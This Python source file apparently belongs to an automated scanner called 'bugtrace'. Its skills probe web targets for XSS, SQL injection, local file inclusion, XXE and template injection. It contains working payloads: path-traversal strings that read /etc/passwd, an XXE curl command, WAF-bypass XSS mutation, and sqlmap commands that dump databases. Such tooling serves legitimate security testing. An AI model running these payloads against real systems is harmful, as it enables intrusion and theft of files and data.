"""
Injection Skills - Vulnerability exploitation for injection attacks.

Contains:
    - XSSSkill: Cross-site scripting with ManipulatorOrchestrator
    - SQLiSkill: SQL injection with ladder logic (detector -> SQLMap)
    - LFISkill: Local File Inclusion
    - XXESkill: XML External Entity injection
    - CSTISkill: Client/Server-Side Template Injection
"""

import asyncio
from typing import Dict, Any
from .base import BaseSkill
from bugtrace.utils.logger import get_logger
from bugtrace.core.conductor import conductor

logger = get_logger("skills.injection")


class XSSSkill(BaseSkill):
    """XSS exploitation skill - uses ManipulatorOrchestrator for comprehensive XSS testing."""
    
    description = "Test XSS payloads using HTTP Manipulator with WAF bypass and browser verification"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
        from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        findings = []
        test_cases = self._build_test_cases(url)
        logger.info(f"[{self.master.name}] Testing {len(test_cases)} XSS possible injection points")

        manipulator = ManipulatorOrchestrator(rate_limit=0.3)

        try:
            for case in test_cases:
                finding = await self._test_single_param(case, url, manipulator)
                if finding:
                    findings.append(finding)
            await manipulator.shutdown()
        except Exception as e:
            logger.error(f"XSS skill failed: {e}")

        return {
            "success": True,
            "payloads_tested": len(test_cases),
            "findings": findings,
            "xss_found": len(findings) > 0
        }

    def _build_test_cases(self, url: str) -> list:
        """Build list of test cases from URL params and form inputs."""
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        recon_inputs = self.master.thread.metadata.get("inputs_found", [])
        test_cases = []

        if url_params:
            for p, v in url_params.items():
                test_cases.append({"param": p, "value": v[0], "source": "url"})

        for inp in recon_inputs:
            details = inp.get("details", {})
            if details.get("name") and details.get("type") not in ["submit", "button", "hidden"]:
                if not any(t["param"] == details["name"] for t in test_cases):
                    test_cases.append({"param": details["name"], "value": details.get("value", "test"), "source": "form"})

        if not test_cases:
            test_cases = [{"param": "search", "value": "test", "source": "url"}]

        return test_cases

    async def _test_single_param(self, case: dict, url: str, manipulator) -> Dict[str, Any]:
        """Test a single parameter for XSS."""
        from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy

        param_name = case["param"]
        original_value = case["value"]

        request = MutableRequest(
            method="GET" if case["source"] == "url" else "POST",
            url=url,
            params={param_name: original_value} if case["source"] == "url" else {},
            data={param_name: original_value} if case["source"] == "form" else {}
        )

        success, successful_mutation = await manipulator.process_finding(
            request,
            strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
        )

        if not success or not successful_mutation:
            return None

        working_payload = successful_mutation.params.get(param_name, "<script>alert(1)</script>")
        self.master.thread.record_payload_attempt("XSS", f"via Manipulator on {param_name}", success=True)

        return await self._verify_xss_with_browser(url, param_name, working_payload, successful_mutation)

    async def _verify_xss_with_browser(self, url: str, param_name: str, working_payload: str, mutation) -> Dict[str, Any]:
        """Verify XSS with browser and optionally vision validation."""
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, urlencode, urlunparse

        try:
            async with browser_manager.get_page() as page:
                alert_detected, test_url = await self._load_xss_page(page, url, mutation, param_name)
                screenshot_path = await self._capture_screenshot(page, param_name)
                vision_confirmed = await self._vision_validate(screenshot_path, alert_detected)

                return self._build_xss_finding(
                    url, param_name, working_payload, screenshot_path,
                    alert_detected, vision_confirmed, test_url
                )
        except Exception as e:
            logger.debug(f"Browser verification failed: {e}")
            return self._build_fallback_finding(url, param_name, working_payload, e)

    async def _load_xss_page(self, page, url: str, mutation, param_name: str) -> tuple:
        """Load page with XSS payload and detect alert."""
        from urllib.parse import urlparse, urlencode, urlunparse

        alert_detected = False

        async def handle_dialog(dialog):
            nonlocal alert_detected
            alert_detected = True
            await dialog.dismiss()

        page.on("dialog", handle_dialog)
        parsed_url = urlparse(url)

        if mutation.method == "POST":
            logger.info(f"[{self.master.name}] Verifying working POST payload via auto-submit form")
            form_html = self._build_post_form(url, mutation)
            await page.set_content(form_html)
            test_url = url
        else:
            test_params = mutation.params
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(test_params), parsed_url.fragment))
            logger.info(f"[{self.master.name}] Verifying working GET payload: {test_url}")
            await page.goto(test_url, wait_until="networkidle", timeout=10000)

        await asyncio.sleep(2)
        return alert_detected, test_url

    def _build_post_form(self, url: str, mutation) -> str:
        """Build auto-submitting POST form for verification."""
        form_html = f"""<html><body onload="document.forms[0].submit()">
            <form method="POST" action="{url}">"""

        if isinstance(mutation.data, dict):
            for k, v in mutation.data.items():
                form_html += f'<input type="hidden" name="{k}" value=\'{v}\'>\n'

        form_html += "</form></body></html>"
        return form_html

    async def _capture_screenshot(self, page, param_name: str) -> str:
        """Capture screenshot of XSS verification."""
        from bugtrace.core.config import settings
        screenshot_path = str(settings.LOG_DIR / f"{self.master.thread.thread_id}_xss_{param_name}.png")
        await page.screenshot(path=screenshot_path)
        return screenshot_path

    async def _vision_validate(self, screenshot_path: str, alert_detected: bool) -> bool:
        """Validate XSS using vision model if alert not detected."""
        if alert_detected:
            return False

        logger.info(f"[{self.master.name}] Alert NOT detected via event, trying Vision Model validation...")

        from bugtrace.core.llm_client import llm_client
        xss_prompt = self._get_vision_prompt()

        try:
            vision_result = await llm_client.generate_with_image(
                prompt=xss_prompt,
                image_path=screenshot_path,
                module_name="XSS-Vision-Validator"
            )
            vision_confirmed = vision_result.strip().upper().startswith("YES")
            logger.info(f"[{self.master.name}] Vision XSS Validation: {vision_confirmed}")
            return vision_confirmed
        except Exception as ve:
            logger.error(f"[{self.master.name}] Vision validation failed: {ve}")
            return False

    def _get_vision_prompt(self) -> str:
        """Get vision validation prompt."""
        system_prompt = conductor.get_full_system_prompt("xss_skill")
        if system_prompt:
            return system_prompt.split("## XSS Vision Validation Prompt")[-1].strip()

        return (
            "This is a browser screenshot. Look carefully at the page content. "
            "Is there ANY of the following visible on this page? "
            "1) Text containing 'BUGTRACE-XSS-CONFIRMED' or 'BUGTRACE-XSS' "
            "2) A JavaScript alert popup/dialog box "
            "3) Red colored text showing a domain name (like 'example.com') "
            "4) Any text that looks like it was injected (unusual formatting, yellow background). "
            "Answer ONLY: YES or NO"
        )

    def _build_xss_finding(self, url: str, param_name: str, payload: str,
                           screenshot_path: str, alert_detected: bool,
                           vision_confirmed: bool, test_url: str) -> dict:
        """Build XSS finding dictionary."""
        logger.info(f"[{self.master.name}] ✅ XSS confirmed on param: {param_name}")
        return {
            "type": "XSS",
            "url": url,
            "parameter": param_name,
            "param": param_name,
            "payload": payload,
            "screenshot": screenshot_path,
            "validated": True,
            "alert_triggered": alert_detected,
            "vision_confirmed": vision_confirmed,
            "severity": "HIGH" if (alert_detected or vision_confirmed) else "MEDIUM",
            "description": f"Cross-Site Scripting (XSS) confirmed on parameter '{param_name}'. Alert triggered: {alert_detected}. Vision AI confirmed: {vision_confirmed}.",
            "reproduction": f"# Open in browser with payload:\n{test_url}"
        }

    def _build_fallback_finding(self, url: str, param_name: str, payload: str, error: Exception) -> dict:
        """Build fallback finding when browser verification fails."""
        return {
            "type": "XSS",
            "url": url,
            "parameter": param_name,
            "param": param_name,
            "payload": payload,
            "validated": True,
            "severity": "MEDIUM",
            "note": f"Manipulator confirmed, browser verification error: {error}",
            "description": f"Cross-Site Scripting (XSS) detected on parameter '{param_name}'. Payload reflection confirmed but browser verification failed.",
            "reproduction": f"# Inject payload into parameter '{param_name}':\n{payload}"
        }


class SQLiSkill(BaseSkill):
    """SQLi exploitation skill - Ladder Logic: Lightweight Detector -> SQLMap Confirmation."""

    description = "Test SQL injection using Ladder Logic (Detector -> SQLMap Confirmation)"

    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)

        if not url_params:
            return {"success": True, "findings": [], "skipped": "no_params"}

        findings = []
        try:
            potential_vuln, detector_message = await self._run_detector_phase(url)

            if self._should_run_sqlmap(potential_vuln):
                await self._run_sqlmap_phase(url, params, potential_vuln, detector_message, findings)
        except Exception as e:
            logger.error(f"SQLi Ladder Logic test failed: {e}")

        return {
            "success": True,
            "findings": findings,
            "sqli_found": len(findings) > 0
        }

    async def _run_detector_phase(self, url: str) -> tuple:
        """Phase 1: Lightweight Python Detector (FAST, NO DOCKER)."""
        from bugtrace.tools.exploitation.sqli import sqli_detector

        logger.info(f"[{self.master.name}] Ladder Logic Step 1: Lightweight Python Detector...")
        result = await sqli_detector.check(url)

        potential_vuln = False
        detector_message = ""

        if result:
            detector_message, _ = result if isinstance(result, tuple) else (result, None)
            potential_vuln = True
            logger.info(f"[{self.master.name}] 🔍 Detector found potential SQLi: {detector_message}")

        return potential_vuln, detector_message

    def _should_run_sqlmap(self, potential_vuln: bool) -> bool:
        """Check if SQLMap confirmation should run."""
        from bugtrace.core.config import settings

        if settings.MANDATORY_SQLMAP_VALIDATION == False:
            return False

        if potential_vuln or not settings.SAFE_MODE:
            return True

        return self._check_ai_suggests_sqli()

    def _check_ai_suggests_sqli(self) -> bool:
        """Check if AI analysis context suggests SQLi."""
        if not self.master.analysis_context:
            return False

        vulns = self.master.analysis_context.get("consensus_vulns", []) + \
                self.master.analysis_context.get("possible_vulns", [])

        for v in vulns:
            v_type = v.get("type", "").upper()
            if ("SQL" in v_type or "INJECTION" in v_type) and v.get("confidence", 0) >= 0.4:
                logger.info(f"[{self.master.name}] 🧠 AI Analysis suggests SQLi ({v_type}: {v.get('confidence')}) - Forcing SQLMap check")
                return True

        return False

    async def _run_sqlmap_phase(self, url: str, params: Dict[str, Any],
                                potential_vuln: bool, detector_message: str, findings: list):
        """Phase 2: SQLMap Confirmation (GOLD STANDARD)."""
        from bugtrace.tools.external import external_tools

        logger.info(f"[{self.master.name}] Ladder Logic Step 2: SQLMap Confirmation...")

        cookies = await self._get_session_cookies()

        try:
            is_vulnerable = await external_tools.run_sqlmap(
                url, cookies, target_param=params.get("parameter")
            )

            if is_vulnerable:
                finding_data = self._build_sqlmap_finding(url, params, is_vulnerable)
                findings.append(finding_data)
                self.master.thread.record_payload_attempt("SQLi", "sqlmap-confirmed", success=True)
                logger.info(f"[{self.master.name}] ✅ SQLMap confirmed SQLi!")
            elif potential_vuln:
                findings.append(self._build_unconfirmed_finding(url, detector_message))
                logger.info(f"[{self.master.name}] ⚠️ SQLi detected by Python but NOT confirmed by SQLMap")
        except Exception as sqlmap_err:
            logger.debug(f"SQLMap execution failed: {sqlmap_err}")
            if potential_vuln:
                findings.append(self._build_fallback_finding(url, detector_message))

    async def _get_session_cookies(self):
        """Get session cookies from browser manager."""
        from bugtrace.tools.visual.browser import browser_manager

        try:
            session_data = await browser_manager.get_session_data()
            return session_data.get("cookies", [])
        except Exception as e:
            logger.debug(f"Session data fetch failed: {e}")
            return None

    def _build_sqlmap_finding(self, url: str, params: Dict[str, Any], is_vulnerable) -> dict:
        """Build finding data from SQLMap result."""
        if isinstance(is_vulnerable, dict):
            evidence_msg = is_vulnerable.get("output_snippet", "SQLMap confirmed")
            repro_cmd = is_vulnerable.get("reproduction_command", f"sqlmap -u '{url}' --batch --dbs")
            param_name = is_vulnerable.get("parameter", params.get("parameter", "unknown"))

            return {
                "type": "SQLi",
                "url": url,
                "tool": "sqlmap",
                "parameter": param_name,
                "payload": is_vulnerable.get("type", "SQLi"),
                "evidence": f"SQLMap Command: {repro_cmd}\n\nEvidence: {evidence_msg}",
                "validated": True,
                "reproduction_command": repro_cmd,
                "severity": "CRITICAL",
                "description": f"SQL Injection confirmed by SQLMap. Parameter: {param_name}. Type: {is_vulnerable.get('type', 'unknown')}",
                "reproduction": repro_cmd
            }

        # Legacy boolean fallback
        return {
            "type": "SQLi",
            "url": url,
            "tool": "sqlmap",
            "evidence": "SQLMap confirmed SQL Injection vulnerability",
            "validated": True,
            "severity": "CRITICAL",
            "description": "SQL Injection vulnerability confirmed by SQLMap automated scanner.",
            "reproduction": f"sqlmap -u '{url}' --batch --dbs"
        }

    def _build_unconfirmed_finding(self, url: str, detector_message: str) -> dict:
        """Build finding for detector-only detection."""
        return {
            "type": "SQLi",
            "url": url,
            "evidence": f"Potential SQLi detected: {detector_message} (SQLMap could not confirm)",
            "validated": False,
            "severity": "MEDIUM",
            "method": "sqli_detector",
            "description": f"Potential SQL Injection detected by error-based analysis but not confirmed by SQLMap. May require manual verification. Evidence: {detector_message[:200] if detector_message else 'N/A'}",
            "reproduction": f"sqlmap -u '{url}' --batch --level=5 --risk=3"
        }

    def _build_fallback_finding(self, url: str, detector_message: str) -> dict:
        """Build fallback finding when SQLMap fails but detector found something."""
        return {
            "type": "SQLi",
            "url": url,
            "evidence": detector_message,
            "validated": True,
            "method": "sqli_detector",
            "severity": "HIGH",
            "description": f"SQL Injection detected via error-based analysis. SQLMap could not run but detector found evidence: {detector_message[:200] if detector_message else 'N/A'}",
            "reproduction": f"sqlmap -u '{url}' --batch --dbs"
        }


class LFISkill(BaseSkill):
    """LFI exploitation skill - tests for Local File Inclusion vulnerabilities."""

    description = "Test Local File Inclusion payloads on file-related parameters"

    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)

        findings = []
        try:
            async with browser_manager.get_page() as page:
                for param_name, values in url_params.items():
                    if self._is_lfi_candidate_param(param_name):
                        finding = await self._test_param_for_lfi(page, url, param_name)
                        if finding:
                            findings.append(finding)
                            break
        except Exception as e:
            logger.error(f"LFI skill failed: {e}")

        return {
            "success": True,
            "findings": findings,
            "lfi_found": len(findings) > 0
        }

    def _is_lfi_candidate_param(self, param_name: str) -> bool:
        """Check if parameter name suggests LFI vulnerability."""
        lfi_params = ["file", "path", "page", "doc", "document", "folder", "root",
                      "dir", "directory", "include", "img", "image", "template"]

        param_lower = param_name.lower()
        return param_lower in lfi_params or any(p in param_lower for p in lfi_params)

    async def _test_param_for_lfi(self, page, url: str, param_name: str):
        """Test a single parameter with LFI payloads."""
        lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "file:///etc/passwd"
        ]

        for payload in lfi_payloads:
            finding = await self._test_single_payload(page, url, param_name, payload)
            if finding:
                return finding

        return None

    async def _test_single_payload(self, page, url: str, param_name: str, payload: str):
        """Test a single LFI payload."""
        test_url = f"{url.split('?')[0]}?{param_name}={payload}"

        try:
            await page.goto(test_url, wait_until="domcontentloaded", timeout=8000)
            content = await page.content()

            indicator = self._check_lfi_indicators(content)
            if indicator:
                return await self._build_lfi_finding(page, url, param_name, payload, indicator, test_url)
        except Exception as e:
            logger.debug(f"LFI test failed for {payload}: {e}")

        return None

    def _check_lfi_indicators(self, content: str):
        """Check if content contains LFI success indicators."""
        lfi_indicators = ["root:x:0:0", "bin:x:1:1", "daemon:x:2:2"]

        for indicator in lfi_indicators:
            if indicator in content:
                return indicator

        return None

    async def _build_lfi_finding(self, page, url: str, param_name: str,
                                  payload: str, indicator: str, test_url: str) -> dict:
        """Build LFI finding with screenshot."""
        from bugtrace.core.config import settings

        screenshot_path = str(settings.LOG_DIR / f"{self.master.thread.thread_id}_lfi.png")
        await page.screenshot(path=screenshot_path)

        self.master.thread.record_payload_attempt("LFI", payload, success=True)
        logger.info(f"[{self.master.name}] ✅ LFI confirmed: {payload}")

        return {
            "type": "LFI",
            "url": url,
            "parameter": param_name,
            "param": param_name,
            "payload": payload,
            "screenshot": screenshot_path,
            "validated": True,
            "severity": "CRITICAL",
            "description": f"Local File Inclusion (LFI) vulnerability confirmed. Parameter '{param_name}' allows reading local files. Indicator found: {indicator}",
            "reproduction": f"curl '{test_url}' | grep -i '{indicator[:20]}'"
        }


class XXESkill(BaseSkill):
    """XXE exploitation skill - uses existing XXE detector."""
    
    description = "Test XML External Entity injection on XML-accepting endpoints"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.exploitation.xxe import xxe_detector
        
        findings = []
        
        try:
            # XXE detector needs base_xml and headers
            base_xml = '<?xml version="1.0"?><root><data>test</data></root>'
            headers = {"Content-Type": "application/xml"}
            
            result = await xxe_detector.check(url, base_xml, headers)
            
            if result:
                findings.append({
                    "type": "XXE",
                    "url": url,
                    "evidence": result,
                    "validated": True,
                    "severity": "CRITICAL",
                    "description": f"XML External Entity (XXE) injection vulnerability detected. Server parses external entities allowing file read or SSRF. Evidence: {result[:200] if result else 'N/A'}",
                    "reproduction": f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
                })

                self.master.thread.record_payload_attempt("XXE", "auto-detect", success=True)
                logger.info(f"[{self.master.name}] ✅ XXE detected")
                
        except Exception as e:
            logger.debug(f"XXE test failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "xxe_found": len(findings) > 0
        }


class CSTISkill(BaseSkill):
    """CSTI/SSTI skill - tests for Client/Server-Side Template Injection."""
    
    description = "Test for Template Injection vulnerabilities (Jinja2, Twig, etc)"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from bugtrace.tools.exploitation.csti import csti_detector
        
        findings = []
        
        try:
            result = await csti_detector.check(url)
            
            if result:
                findings.append({
                    "type": "CSTI",
                    "url": url,
                    "evidence": result,
                    "validated": True,
                    "severity": "HIGH",
                    "description": f"Client-Side Template Injection (CSTI) vulnerability detected. Template expressions are evaluated allowing arbitrary JavaScript execution. Evidence: {result[:200] if result else 'N/A'}",
                    "reproduction": f"curl '{url}' --data-urlencode 'param={{{{7*7}}}}' | grep 49"
                })

                self.master.thread.record_payload_attempt("CSTI", "auto-detect", success=True)
                logger.info(f"[{self.master.name}] ✅ CSTI detected")
                
        except Exception as e:
            logger.debug(f"CSTI test failed: {e}")
        
        return {
            "success": True,
            "findings": findings,
            "csti_found": len(findings) > 0
        }
